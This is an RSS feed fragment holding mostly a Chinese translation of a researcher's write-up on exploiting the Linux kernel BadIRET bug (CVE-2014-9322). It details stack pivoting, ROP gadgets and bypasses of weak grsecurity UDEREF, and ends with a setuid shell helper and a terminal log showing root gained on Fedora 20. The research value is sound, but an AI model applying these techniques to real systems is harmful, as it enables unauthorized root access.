&lt;p&gt;[12] Is BEAST Still a Threat? (Qualys Security Labs; 10 September 2013)
https://community.qualys.com/blogs/securitylabs/2013/09/10/is-beast-still-a-threat&lt;/p&gt;

&lt;p&gt;[13] This POODLE bites: exploiting the SSL 3.0 fallback (Google Online Security Blog, 14 October 2014)
http://googleonlinesecurity.blogspot.co.uk/2014/10/this-poodle-bites-exploiting-ssl-30.html&lt;/p&gt;

&lt;p&gt;[14] About EV SSL Certificates (CA/B Forum web site)
https://www.cabforum.org/certificates.html&lt;/p&gt;

&lt;p&gt;[T1] HAS THE RSA ALGORITHM BEEN COMPROMISED AS A RESULT OF BERNSTEIN’S PAPER?
http://www.emc.com/emc-plus/rsa-labs/historical/has-the-rsa-algorithm-been-compromised.htm&lt;/p&gt;

&lt;p&gt;[T2] Poodle Bites TLS
https://community.qualys.com/blogs/securitylabs/2014/12/08/poodle-bites-tls&lt;/p&gt;

&lt;p&gt;[T3] Lucky Thirteen: Breaking the TLS and DTLS Record Protocols
http://www.isg.rhul.ac.uk/tls/Lucky13.html&lt;/p&gt;
</description>
        <pubDate>Wed, 29 Jul 2015 01:59:07 +0800</pubDate>
        <link>http://www.hardenedlinux.org/cryptography/2015/07/29/ssl-tls-deployment-1.4.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/cryptography/2015/07/29/ssl-tls-deployment-1.4.html</guid>
        
        
        <category>cryptography</category>
        
      </item>
    
      <item>
        <title>后续故事：数字军火级别的&quot;BadIRET&quot;漏洞利用(CVE-2014-9322)</title>
        <description>&lt;p&gt;作者：pi3, July 4 2015&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;http://blog.pi3.com.pl/?p=509&quot;&gt;Follow-up on Exploiting “BadIRET” vulnerability (CVE-2014-9322)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;译者：Shawn the R0ck, July 5 2015&lt;/p&gt;

&lt;p&gt;Shawn：nergal在2015年2月公开的针对&lt;a href=&quot;http://hardenedlinux.org/jekyll/update/2015/07/05/badiret-analysis.html&quot;&gt;BadIRET漏洞的分析文章&lt;/a&gt;仿佛就在昨天，但Linux内核社区对安全的态度的确比10年还糟糕，Linux内核社区一如既往坚持”Security through obscurity”这种简单到根本不用考虑斯拉夫兵工厂的威胁建模，不辛的是，BadIRET又是一例Linux内核社区认为几乎不可利用但实际是可利用的漏洞，更糟糕的是一些商业GNU/Linux厂商因为各种原因（在后棱镜时代，不得不考虑非商业因素的可能）基本按照&lt;a href=&quot;https://securityblog.redhat.com/2015/04/08/dont-judge-the-risk-by-the-logo/&quot;&gt;是否有公开的漏洞利用会成为他们对于风险评估的重要指标&lt;/a&gt;，这种说法好像是当0-day exploit从来都不存在一样，这的确是一个黑暗的时代，就算没有Mr.Snowden，这的确也称的上是一个黑暗的信息时代，anyway，这次pi3公开了BadIRET的漏洞利用代码，这对于安全研究人员来说是一个好事，也希望整个事件能帮助个人以及企业GNU/Linux用户对于安全有正确的认识。&lt;/p&gt;

&lt;p&gt;一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&amp;gt; exploitable bug(vulnerability) –&amp;gt; poc –&amp;gt; exploit –&amp;gt; reliable/weaponized exploit。虽然skiddie都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但让数字军火商或者斯拉夫兵工厂关心的漏洞属于能到最后两个阶段的vulnerability。&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;by pi3&lt;/p&gt;

&lt;p&gt;Hi,&lt;/p&gt;

&lt;p&gt;分析&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322&quot;&gt;CVE-2014-9322&lt;/a&gt;的旅程并非一帆风顺，但它值得我们花一些时间去分析所有的信息。我会尽力…&lt;/p&gt;

&lt;h2 id=&quot;introduction--non-technical-almost&quot;&gt;1) Introduction – non-technical (almost)&lt;/h2&gt;

&lt;p&gt;一切都开始于&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9090&quot;&gt;CVE-2014-9090&lt;/a&gt;。这个漏洞是由Andy Lutomirski发现的，引用MITRE的描述：&lt;/p&gt;
&lt;pre&gt;
Linux内核3.17.4在arch/x86/kernel/traps.c里的do_double_fault函数没有正确
的处理SS(Stack Segment)寄存器相关的错误处理，导致本地用户可以发启DoS攻
击让内核panic(...)
&lt;/pre&gt;

&lt;p&gt;这个顶多导致本地DoS攻击的洞对于防御者而言听起来并不是那么重要（但也引起了一定的注意，因为毕竟是一个漏洞），对于攻击者的角度也是一样，因为即使利用成功也无法获得巨大利益( Shawn:相对于获得root而言)。&lt;/p&gt;

&lt;p&gt;“有趣”的是在Borislav Petkov问了一些问题后，Andy Lutomirski在相同的功能里发现了另一个被第一个漏洞掩盖的漏洞。不幸(幸运)的是，这是一个很严重的漏洞。Linux内核在x86架构下没有恰当的处理于SS寄存器有关的错误处理。引用自MITRE：&lt;/p&gt;
&lt;pre&gt;
&quot;(...)通过触发一个IRET指令从一个错误的空间去去访问一个GS基地址从而让本地用户获取最高权限&quot;
&lt;/pre&gt;

&lt;p&gt;这个漏洞的特性听起来很熟悉吗？&lt;/p&gt;

&lt;p&gt;那Rafal ‘n3rgal’ Wojtczuk的研究最终停止于&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0217&quot;&gt;CVE-2012-0217&lt;/a&gt;呢？(这个直接指向了&lt;a href=&quot;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0744&quot;&gt;CVE-2006-0744&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;是的…原则上两个漏洞都给我们了相同的东西 — 我们能强制内核去执行在用户空间控制的GS基地址（通过%gs寄存器）。&lt;/p&gt;

&lt;p&gt;因为一些原因CVE-2014-9322并没有引起太多注意（跟CVE-2006-0744类似），直到Rafal ‘n3rgal’ Wojtczuk在2015年2月5日在Bromium Labs的blog上&lt;a href=&quot;http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&quot;&gt;公布了另外震撼的研究&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;这篇分析谈到了关于这个漏洞的本质，即可以被利用为代码执行（这可不是简单的事情，点赞n3rgal的研究）和使用单个字节为NULL的写操作让整个漏洞利用成为军火级别的稳定利用，能绕过SMEP（不是SMAP）。非常推荐读读这篇分析。&lt;/p&gt;

&lt;p&gt;在这篇漏洞分析公开后引起了更多的关注（特别是grsecurity的twitter帐号:-)）。知道现在（差不多半年了）也没有公开的真正的漏洞利用去实现Rafal关于代码执行的想法。只有一个演示DoS攻击的PoC（结果和CVE-2014-9090相同 — 没多大用处）：&lt;/p&gt;

&lt;p&gt;https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;另外一个实现：&lt;/p&gt;

&lt;p&gt;https://www.exploit-db.com/exploits/36266/&lt;/p&gt;

&lt;h2 id=&quot;more-technical-part-based-on-fedora-20---kernel-31110-301fc20x8664&quot;&gt;2) More technical part (based on Fedora 20 -&amp;gt; kernel: 3.11.10-301.fc20.x86_64)&lt;/h2&gt;

&lt;p&gt;我决定接受这个挑战去完整的实现Rafal的想法并且在成功的过程中解决了很多有趣的问题。我将以Rafal的分析文章结束作为开始，最终成功的实现stack pivoting和执行ROP gadgets（在他的描述里是去关掉CR4寄存器中关掉SMEP和在用户空间的页去执行’真’的shellcode/kernelcode）。&lt;/p&gt;

&lt;p&gt;*) Stack pivoting和ROP执行于follow_link()函数的上下文，这个函数是inline所以整个实现都在path_openat()的代码段里。这里是概述的上下文流程：&lt;/p&gt;
&lt;pre&gt;
SyS_open -&amp;gt; SYSC_open -&amp;gt; do_sys_open -&amp;gt; do_filp_open -&amp;gt; path_openat -&amp;gt; follow_link()
&lt;/pre&gt;

&lt;p&gt;Inline函数调用相对地址，这可以最终重定向到我们的代码：&lt;/p&gt;
&lt;pre&gt;
...
   0xffffffff811b84ab &amp;lt;+955&amp;gt;:   jmpq   0xffffffff811b81b3 
   0xffffffff811b84b0 &amp;lt;+960&amp;gt;:   movl   $0x4,0x40(%r12)
   0xffffffff811b84b9 &amp;lt;+969&amp;gt;:   mov    0x30(%r15),%rax
   0xffffffff811b84bd &amp;lt;+973&amp;gt;:   mov    %r15,%rdi
   0xffffffff811b84c0 &amp;lt;+976&amp;gt;:   mov    %r12,%rsi
   0xffffffff811b84c3 &amp;lt;+979&amp;gt;:   mov    0x20(%rax),%rax
   0xffffffff811b84c7 &amp;lt;+983&amp;gt;:   callq  *0x8(%rax)
                                ^^^^^^^^^^^^^^^^^
   0xffffffff811b84ca &amp;lt;+986&amp;gt;:   cmp    $0xfffffffffffff000,%rax
   0xffffffff811b84d0 &amp;lt;+992&amp;gt;:   mov    %rax,%r15
   0xffffffff811b84d3 &amp;lt;+995&amp;gt;:   jbe    0xffffffff811b8532 
   0xffffffff811b84d5 &amp;lt;+997&amp;gt;:   mov    %r12,%rdi
   0xffffffff811b84d8 &amp;lt;+1000&amp;gt;:  mov    %eax,%ebx
   0xffffffff811b84da &amp;lt;+1002&amp;gt;:  callq  0xffffffff811b2930 
...
&lt;/pre&gt;

&lt;p&gt;在我们的代码执行后第一个问题来了，所有调用函数path_put(), do_last(), dput(), mntput()或者put_link()可能都会遇到内核锁。因为栈已经被pivoted可不会带来一个好的结局。另外，path_openat()里有很多inline函数，一些寄存器有特殊意义（指针指向特定的结构或者对象），所以内核去访问某个点可能会直接造成内核崩溃。&lt;/p&gt;

&lt;p&gt;一开始我尝试跟踪了所有有问题的执行过程和手工修复了一些，但这条路径下的寄存器/对象/spinlocks之间有太多的关联…（btw，不幸（幸运）的是，跟之前的版本相比，Linux内核3.xx改变了raw_spin_lock的内部描述，当你打算手工同步时这会成为一个问题）。&lt;/p&gt;

&lt;p&gt;这里需要一个更好的解决方案，如果你思考下关于pivoting自己你可能会找到一个方案。如果你打算手工修复所有在这个过程中遇到的问题你也能成功。如果你找到一条路径去把原始的栈帧”恢复“到stack pivoting之前的状态，这会帮你搞定所有的锁问题，正确的对栈进行unwind以及系统会稳定的运行。这是能实现的，让我们称她为reverse stack pivoting;-)。在stack pivot后，在临时寄存器里你应该会拥有一个你想知道的栈的合法地址。在我们的场景里稍微有些复杂，因为我们失去了地址的32位的最高有效位。ROP gadgets像：&lt;/p&gt;
&lt;pre&gt;
   0xffffffff8119f1ed &amp;lt;__mem_cgroup_try_charge+1949&amp;gt;:   xchg   %eax,%esp
   0xffffffff8119f1ee &amp;lt;__mem_cgroup_try_charge+1950&amp;gt;:   retq
&lt;/pre&gt;

&lt;p&gt;为什么这些gadget会产生而32 bits会丢失呢？请阅读Rafal的文章。&lt;/p&gt;

&lt;p&gt;所以，如果我们在直接pivoting后找到了一些能保存原始栈上32位最低有效位ROP gadget，我们可以尝试在把控制权交给内核前恢复和重构原始地址。我选择了如下ROP-gadget：&lt;/p&gt;
&lt;pre&gt;
   0xffffffff8152d8fe :       push   %rax
   0xffffffff8152d8ff :       pop    %rax
   0xffffffff8152d900 :       pop    %rbp
   0xffffffff8152d901 :       retq
&lt;/pre&gt;

&lt;p&gt;去执行push %rax（这个值事实上高位被清零了）和保存值后移动栈指针。在这个点上我们可以精确的计算它会存在哪里。&lt;/p&gt;

&lt;p&gt;问题解决了（reverse-stack pivot胜利 :P）&lt;/p&gt;

&lt;p&gt;*) 如果你的shellcode执行时间过长，有很大的概率进程调度器会让更紧急的任务先执行， – 取决于当前的执行和什么样的任务会抢占。你可能经常收到APIC时间中断去更新进程时间，在有些情况下可能会带给你的漏洞利用一些麻烦，你必须考虑这些事情！&lt;/p&gt;

&lt;p&gt;btw.如果你运气不好，在做stack pivoting时刚好被抢占;p（Shawn:这种概率都遇上了你也就认了吧，可能真是上帝让你别去日你的当前目标；-））&lt;/p&gt;

&lt;p&gt;*) 我们的代码执行时但proc_root结构被损坏…;-) 这不是我们愿意看到的。如果有其他进程对/proc文件系统有任何操作，它会戏剧性的增加内核崩溃的概率。proc_root.subdir值必须尽快被恢复以避免系统被随机的crash掉。有几种可能的方法：&lt;/p&gt;

&lt;p&gt;a) 反而覆盖subdir的6 bytes只覆盖其中5个，这样其中3 bytes未碰。这意味着我们可以通过0xffff8800和最高有效位相加来轻松重构原始值，每一个单独byte最多256次尝试。内核crash的概率很低（触及到未映射的页）。另外，这个需要用户空间分配16MB去保证引用被覆盖的proc_root.subdir总是在我们控制的内存里。&lt;/p&gt;

&lt;p&gt;b) 我们可以通过’阻止’#PF来爆破整个地址。在一段很短的时间里，我们可以用一段简单程序覆盖#PF处理程序：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;从栈上获得异常&lt;/li&gt;
  &lt;li&gt;改变已知映射会造成crash的地址&lt;/li&gt;
  &lt;li&gt;重启错误处理指令&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;原生的爆破循环会继续运行&lt;/p&gt;

&lt;p&gt;c) 忽略所有的问题，仅仅去重构能通过爆破获得的剩下的bytes。很明显这很稳定和高效，我们知道HSB是0xfff8800和两个LSB bytes。我们需要找到2个未知的bytes。在Linux上（与Windows相反），内核内存不被paged out（swapped out）。去爆破中间的2个bytes来重构地址时访问到未映射的内存页概率是很低的 – believe me or not, it works well :)&lt;/p&gt;

&lt;p&gt;问题同样是如何判断地址是正确的。这很简单，struct proc_dir_entry有’parent’。我们必须找到proc_root(已知地址）的特定offset。最终，我们检查了65536个地址，#FP的概率也是很低的。我从来没遇到过那种情况。&lt;/p&gt;

&lt;p&gt;总结我们的shellcode必须：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;保存原生的栈指针值&lt;/li&gt;
  &lt;li&gt;关闭中断（防止被抢占）和开始重构被污染的proc_root.subdir值&lt;/li&gt;
  &lt;li&gt;实现真正的(s)hellcode&lt;/li&gt;
  &lt;li&gt;恢复原生栈指针&lt;/li&gt;
  &lt;li&gt;恢复栈帧指针&lt;/li&gt;
  &lt;li&gt;恢复寄存器指向的内部对象&lt;/li&gt;
  &lt;li&gt;启动中断和返回正常内核执行&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;grsecurity--uderef&quot;&gt;3) Grsecurity =&amp;gt; UDEREF&lt;/h2&gt;

&lt;p&gt;之前我提到过Rafal的研究曾经被spender给“看到”过：&lt;/p&gt;

&lt;p&gt;http://twitter.com/grsecurity/status/562363332079144960
http://twitter.com/grsecurity/status/562363788125831172&lt;/p&gt;

&lt;p&gt;另外，一些人建议UDEREF和SMAP一样能高效的防御这个漏洞：&lt;/p&gt;

&lt;p&gt;http://seclists.org/oss-sec/2014/q4/1052&lt;/p&gt;

&lt;pre&gt;
&quot;这可能是一个容易的提权的漏洞利用，但除了针对带有SMAP和UDEREF的系统。在
SMAP/UDEREF上，假定mitigation都是奏效的，这个bug的影响可能会局限于大规
模的memory corruption和crash或者重启。&quot;
&lt;/pre&gt;

&lt;p&gt;这并不是完全正确。UDEREF可能跟（事实上，甚至远超）SMAP一样高效，或者仅像SMEP（在AMD64上）一样有效的防御漏洞利用。但问题出在哪里呢？目前针对AMD64平台，UDEREF有3种不同的实现：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;慢/弱的遗留实现&lt;/li&gt;
  &lt;li&gt;针对Sandy Bridge(Shawn：2011年）和后续CPU的强实现&lt;/li&gt;
  &lt;li&gt;针对Sandy Bridge和后续CPU的快/弱实现&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;第一个针对AMD64平台的UDEREF实现是“弱”实现，相关信息PaX team也有描述：&lt;/p&gt;

&lt;p&gt;http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html&lt;/p&gt;

&lt;pre&gt;
&quot;(...)所以amd64的UDEREF做了些什么呢？在用户空间-&amp;gt;内核空间的转换中基本上
unmaps了原始用户地址范围和重新映射到了不同的地址上并且标记为不可执行
/supervisor权限（所以至少直接的代码执行作为漏洞利用是无法奏效的）
&lt;/pre&gt;

&lt;p&gt;然后接着：&lt;/p&gt;

&lt;pre&gt;
&quot;(..) UDEREF/amd64不保证（合法）用户空间访问函数当用户空间被允许（一些
像特定系统作为用户空间临时访问内核内存，这在UDEREF/i386上被强制一致，而
在AMD64上则没有）不可以直接访问内核内存。所以如果有BUG能骗内核进入用户
空间访问的指针又恰好指向内核空间的话就能利用成功，这一点不像i386的实现。

另外一件糟糕的事情是用户空间的阴影区域，这造成了2个后果：1，用户空间地
址大小小于UDEREF（42 vs 47 bits，这种减小最终影响ASLR）， 2，这个阴影区
域总是映射着，所以内核代码异常访问这个区间并不会造成oops而且也是可被利
用的（如果一个漏洞利用能让内核deref这一区域里的任意地址）(...)&quot;
&lt;/pre&gt;

&lt;p&gt;== weak UDEREF ==
这意味着实际上UDEREF类似SMEP。所以如何能成功的漏洞利用有这个版本的UDEREF的系统呢？你只需要修改ROP。不像在CR4寄存器中关掉SMEP位，而是从用户空间实现完整的ROP的shellcode。这是可能的，“弱”UDEREF实现无法防御这种利用。&lt;/p&gt;

&lt;p&gt;== “new” UDEREF ==&lt;/p&gt;

&lt;p&gt;为什么“强”UDEREF实现是不同的而为什么她需要Sandy Bridge架构的支持？&lt;/p&gt;

&lt;p&gt;对，这是有趣的部分。我从没见关于”新“版UDEREF来自于官方的任何信息。我都没注意到这些实现有些变动是在我玩漏洞利用时产生的;-)&lt;/p&gt;

&lt;p&gt;强UDEREF实现使用的Sandy Bridge++特性被称为PCID，PCID在TLB中打”tags”（Shawn:有些人会翻译为标签）。UDEREF可以完全的分离用户空间和内核空间（通过创建新的PGD表）：&lt;/p&gt;
&lt;pre&gt;
static inline void enter_lazy_tlb(struct mm_struct *mm, struct task_struct *tsk)
{
++#if defined(CONFIG_X86_64) &amp;amp;&amp;amp; defined(CONFIG_PAX_MEMORY_UDEREF)
+     if (!(static_cpu_has(X86_FEATURE_PCID))) {
+             unsigned int i;+                pgd_t *pgd;
++            pax_open_kernel();
+             pgd = get_cpu_pgd(smp_processor_id(), kernel);
+             for (i = USER_PGD_PTRS; i &amp;lt; 2 * USER_PGD_PTRS; ++i)
+                     set_pgd_batched(pgd+i, native_make_pgd(0));
+             pax_close_kernel();
+     }
+#endif

+#if defined(CONFIG_X86_64) &amp;amp;&amp;amp; defined(CONFIG_PAX_MEMORY_UDEREF)
+             if (static_cpu_has(X86_FEATURE_PCID)) {
+                     if (static_cpu_has(X86_FEATURE_INVPCID)) {
+                             u64 descriptor[2];
+                             descriptor[0] = PCID_USER;
+                             asm volatile(__ASM_INVPCID : : &quot;d&quot;(&amp;amp;descriptor), &quot;a&quot;(INVPCID_SINGLE_CONTEXT) :
&quot;memory&quot;);
+                             if (!static_cpu_has(X86_FEATURE_STRONGUDEREF)) {
+                                     descriptor[0] = PCID_KERNEL;
+                                     asm volatile(__ASM_INVPCID : : &quot;d&quot;(&amp;amp;descriptor),
&quot;a&quot;(INVPCID_SINGLE_CONTEXT) : &quot;memory&quot;);
+                             }
+                     } else {
+                             write_cr3(__pa(get_cpu_pgd(cpu, user)) | PCID_USER);
+                             if (static_cpu_has(X86_FEATURE_STRONGUDEREF))
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL | PCID_NOFLUSH);
+                             else
+                                     write_cr3(__pa(get_cpu_pgd(cpu, kernel)) | PCID_KERNEL);
+}
+             } else
+#endif
&lt;/pre&gt;

&lt;p&gt;最终，运行于内核模式的上下文将看不到任何用户空间的页。这个实现我个人相信比SMAP要强的多。为什么呢？&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;你不能只关闭CR4寄存器里的一个bit而关掉整个mitigation&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在SMAP的情况下，你可以看到用户空间的页（有存在的页表翻译用户空间地址，’P’位已经设置）但你仅仅是不能触碰到。在”新”UDEREF的情况下，你根本看不到用户空间（内核上下文的PGD是完全不同的，没有页表描述用户空间地址。’P’没有被设置）。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这个UDEREF版本最早是在grsecurity 3.0于2014年2月引入的。干得漂亮！如果PaX/Grsecurity能公布一些他们的研究细节就更棒了;-)&lt;/p&gt;

&lt;p&gt;Btw. 这2个case都是接触到用户空间地址是一样的 - #PF会被生成;-)&lt;/p&gt;

&lt;p&gt;Btw2. 同样的“强”UDEREF可以不需要硬件PCID特性也能实现。但最大的区别就是性能。如果没有硬件PCID支持的情况下从性能的角度看，这个特性会很糟糕。&lt;/p&gt;

&lt;h2 id=&quot;summarizing-&quot;&gt;== Summarizing ==&lt;/h2&gt;

&lt;p&gt;这个漏洞可以在UDEREF下被利用，但不能在使用了Sandy Bridge++特性的“新”UDEREF下被利用。&lt;/p&gt;

&lt;p&gt;事实上，你仍然可以用这个漏洞针对“新”UDEREF用作DoS攻击？如何实现呢？这个很有趣，你可以强制#PF的无限循环;-) 当内核进入do_general_protection()函数后会尝试通过以下指令让GS基读取GDT：&lt;/p&gt;

&lt;pre&gt;
    0xffffffff8172910e :       mov    %gs:0xa880,%rbx
&lt;/pre&gt;

&lt;p&gt;这个情况下GS基是指向用户空间的内存。因为这里没有PTE条目（内核看不到用户空间的页），#PF将会被产生。page_fault()函数会被执行：&lt;/p&gt;

&lt;pre&gt;
page_fault -&amp;gt; do_page_fault -&amp;gt; __do_page_fault -&amp;gt; restore_args
&lt;/pre&gt;

&lt;p&gt;这会导致再次读GDT然后下一个#PF产生，就这样一直循环下去;-) 是的，你可以让内核崩溃掉但没办法做进一步的漏洞利用。漏洞利用在这里被阻止了。&lt;/p&gt;

&lt;h2 id=&quot;funny-facts-&quot;&gt;4) Funny facts;-)&lt;/h2&gt;

&lt;p&gt;a) 当你调用pthread_create()函数时，一些版本的libthread需要创建RWX权限的内存。这在PaX/Grsec的mmap()加固是不被允许的，当pthread_create()调用mmap()时进程会被杀掉;-) 我在Ubuntu LTS上运行grsecurity加固内核时遇到过这个情况。&lt;/p&gt;

&lt;p&gt;b) 在内核3.11.10-301.fc20.x86_64的__switch_to()函数实现中使用了OSXSAVE扩展（CR4寄存器的bit 18），但内核并不检查这个CPU是否有这个扩展：&lt;/p&gt;
&lt;pre&gt;
     0xffffffff81011714 &amp;lt;__switch_to+644&amp;gt;    xsaveopt64 (%rdi)
&lt;/pre&gt;

&lt;p&gt;__switch_to()是在禁用中断时运行，如果OSXSAVE扩展没有打开的话，CPU会生成一个#UD造成死锁。在进入__switch_to()指令之前，不管是否关闭中断都会锁住runqueue运行队列，在#UD的情况下不会被解锁。&lt;/p&gt;

&lt;p&gt;我好奇如果有人真的遇到过这个问题;-)&lt;/p&gt;

&lt;p&gt;c) Fedora 20作为测试环境，这个漏洞利用非常稳定（&lt;a href=&quot;http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz&quot;&gt;源代码在我的网站上已经公布&lt;/a&gt;）：&lt;/p&gt;
&lt;pre&gt;
[pi3@localhost clean_9322]$ cat z_shell.c
#include 

int main(void) {

   char *p_arg[] = { &quot;/bin/sh&quot;, NULL };

   setuid(0);
   seteuid(0);
   setgid(0);
   setegid(0);
   execv(&quot;/bin/sh&quot;,p_arg,NULL);

}
[pi3@localhost clean_9322]$ gcc z_shell.c -o z_shell
[pi3@localhost clean_9322]$ cp z_shell /tmp/pi3
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwxrwxr-x 1 pi3 pi3 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
sh-4.2$ exit
exit
[pi3@localhost clean_9322]$ gcc -o procrop procrop.c setss.S
[pi3@localhost clean_9322]$ gcc -o p_write8 swapgs.c setss.S -lpthread
swapgs.c: In function ‘main’:
swapgs.c:175:29: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
               : &quot;r&quot;(4), &quot;r&quot;((int)p_to_d), &quot;r&quot;(1)
                             ^
[pi3@localhost clean_9322]$ ./procrop

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal &#39;n3rgal&#39; Wojtczuk
                           &amp;amp;&amp;amp; Adam &#39;pi3&#39; Zabrocki

                Usage: ./procrop 

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$ ./procrop 1 &amp;amp;
[1] 5827
[pi3@localhost clean_9322]$
        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal &#39;n3rgal&#39; Wojtczuk
                           &amp;amp;&amp;amp; Adam &#39;pi3&#39; Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ps aux |grep procr
pi3       5827 83.0  0.0   4304   320 pts/1    RL   23:12   0:05 ./procrop 1
pi3       5829  0.0  0.1 112660   916 pts/1    S+   23:12   0:00 grep --color=auto procr
[pi3@localhost clean_9322]$ ./p_write8

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal &#39;n3rgal&#39; Wojtczuk
                           &amp;amp;&amp;amp; Adam &#39;pi3&#39; Zabrocki

                Usage: ./p_write8 

                        Number:

                                1 - kernel [3.11.10-301.fc20.x86_64]

[pi3@localhost clean_9322]$
[pi3@localhost clean_9322]$ ./p_write8 1

        ...::: -=[ Exploit for CVE-2014-9322 ]=- :::...
                           by Rafal &#39;n3rgal&#39; Wojtczuk
                           &amp;amp;&amp;amp; Adam &#39;pi3&#39; Zabrocki

        [+] Using kernel target: 3.11.10-301.fc20.x86_64
        [+] mmap() memory in first 2GB of address space... DONE!
        [+] Preparing kernel structures... DONE! (ovbuf at 0x602140)
        [+] Creating LDT for this process... DONE!
        [+] Press enter to start fun-game...
[exploit] pthread runningAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[1]+  Done                    ./procrop 1
Segmentation fault (core dumped)
[pi3@localhost clean_9322]$ ls -al /tmp/pi3
-rwsrwsrwx 1 root root 8764 May  6 23:09 /tmp/pi3
[pi3@localhost clean_9322]$ id
uid=1000(pi3) gid=1000(pi3) groups=1000(pi3)
[pi3@localhost clean_9322]$ /tmp/pi3
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root),1000(pi3)
sh-4.2# exit
exit
[pi3@localhost clean_9322]$
&lt;/pre&gt;

&lt;p&gt;References:&lt;/p&gt;

&lt;p&gt;1) http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&lt;/p&gt;

&lt;p&gt;2) https://rdot.org/forum/showthread.php?t=3341&lt;/p&gt;

&lt;p&gt;3) https://www.exploit-db.com/exploits/36266/&lt;/p&gt;

&lt;p&gt;4) http://blog.pi3.com.pl/?p=509&lt;/p&gt;

&lt;p&gt;5) http://twitter.com/grsecurity/status/562363332079144960&lt;/p&gt;

&lt;p&gt;6) http://twitter.com/grsecurity/status/562363788125831172&lt;/p&gt;

&lt;p&gt;7) http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz&lt;/p&gt;

&lt;p&gt;8) http://seclists.org/oss-sec/2014/q4/1052&lt;/p&gt;

&lt;p&gt;9) http://grsecurity.net/pipermail/grsecurity/2010-April/001024.html&lt;/p&gt;

&lt;p&gt;UPDATE:基于PCID的UDEREF实现最早是在2013年8月，而不是2014年2月。&lt;/p&gt;

